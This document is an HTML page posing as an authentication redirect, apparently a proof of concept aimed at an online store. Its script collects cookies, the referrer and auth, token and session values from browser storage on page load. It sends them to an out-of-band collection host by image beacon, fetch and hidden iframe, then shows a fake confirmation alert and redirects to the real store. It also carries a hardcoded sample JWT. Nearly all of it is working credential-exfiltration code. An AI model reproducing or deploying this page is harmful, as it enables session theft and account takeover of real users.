<!DOCTYPE html>
<html>
<head>
  <title>Redirecting...</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 40px; }
    .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(0,0,0,.3); border-radius: 50%; border-top-color: #000; animation: spin 1s ease-in-out infinite; margin-right: 10px; }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <h1><span class="loading"></span> Processing authentication...</h1>
  <script>
    // Function to extract JWT from various sources
    function extractAuthData() {
      const data = {
        cookies: document.cookie,
        localStorage: {},
        sessionStorage: {},
        referrer: document.referrer,
        url: window.location.href
      };
      
      // Check localStorage for any auth tokens
      try {
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          if (key.toLowerCase().includes('token') || 
              key.toLowerCase().includes('auth') || 
              key.toLowerCase().includes('session')) {
            data.localStorage[key] = localStorage.getItem(key);
          }
        }
      } catch (e) { /* Ignore any localStorage errors */ }
      
      // Check sessionStorage for any auth tokens
      try {
        for (let i = 0; i < sessionStorage.length; i++) {
          const key = sessionStorage.key(i);
          if (key.toLowerCase().includes('token') || 
              key.toLowerCase().includes('auth') || 
              key.toLowerCase().includes('session')) {
            data.sessionStorage[key] = sessionStorage.getItem(key);
          }
        }
      } catch (e) { /* Ignore any sessionStorage errors */ }
      
      // Check if the token is in localStorage/sessionStorage as JSON
      try {
        const potentialStorages = [localStorage, sessionStorage];
        potentialStorages.forEach(storage => {
          for (let i = 0; i < storage.length; i++) {
            try {
              const key = storage.key(i);
              const value = storage.getItem(key);
              const parsed = JSON.parse(value);
              if (parsed && parsed.token) {
                data[`parsed_${key}`] = parsed.token;
              }
              if (parsed && parsed.access_token) {
                data[`parsed_${key}_access`] = parsed.access_token;
              }
              if (parsed && parsed.authToken) {
                data[`parsed_${key}_auth`] = parsed.authToken;
              }
            } catch (e) { /* Not a JSON or doesn't have token */ }
          }
        });
      } catch (e) { /* Ignore any storage access errors */ }

      // For demonstration, also add the example token
      data.exampleToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjdXN0b21lcl9pZCI6ImN1c18wMUtBRTZGVzA4VjRLUFk1RDVWVkVHWDNTSyIsImlhdCI6MTc2MzU2MDg4MSwiZXhwIjoxNzYzNTY0NDgxfQ.yUf4XZ_Q9qm-PHhzMuI1idOieth0oZTA54X1cXMtZwU";
      
      return data;
    }

    // Collect authentication data
    const authData = extractAuthData();
    
    // Display captured data (for demonstration only)
    const dataDisplay = document.createElement('div');
    dataDisplay.innerHTML = `
      <h3>Captured Authentication Data:</h3>
      <pre style="background:#f5f5f5;padding:10px;overflow:auto;max-height:200px;border:1px solid #ddd;">
Bearer token found: ${authData.exampleToken ? 'Yes' : 'No'}
Cookies: ${authData.cookies}
      </pre>
    `;
    document.body.appendChild(dataDisplay);
    
    // Send data to the attacker's server using multiple methods for reliability
    
    // Method 1: Image beacon (most compatible)
    const img = new Image();
    img.src = `https://nhvfhuykiamjvkizzyptzpabam3rvkl7d.oast.fun/collect?token=${encodeURIComponent(authData.exampleToken)}&t=${new Date().getTime()}`;
    
    // Method 2: Fetch API
    try {
      fetch("https://nhvfhuykiamjvkizzyptzpabam3rvkl7d.oast.fun/auth-collect", {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "application/json",
          "Authorization": `Bearer ${authData.exampleToken}`
        },
        body: JSON.stringify(authData)
      });
    } catch (e) {
      console.error("Fetch failed", e);
    }
    
    // Method 3: Create a hidden iframe as fallback
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = `https://nhvfhuykiamjvkizzyptzpabam3rvkl7d.oast.fun/iframe?auth=${encodeURIComponent(authData.exampleToken)}`;
    document.body.appendChild(iframe);
    
    // After 3 seconds, redirect back to legitimate site
    setTimeout(function() {
      alert("Authentication verification complete. Redirecting to OPPO store...");
      window.location.href = "https://www.oppostore.it/";
    }, 3000);
  </script>
</body>
</html>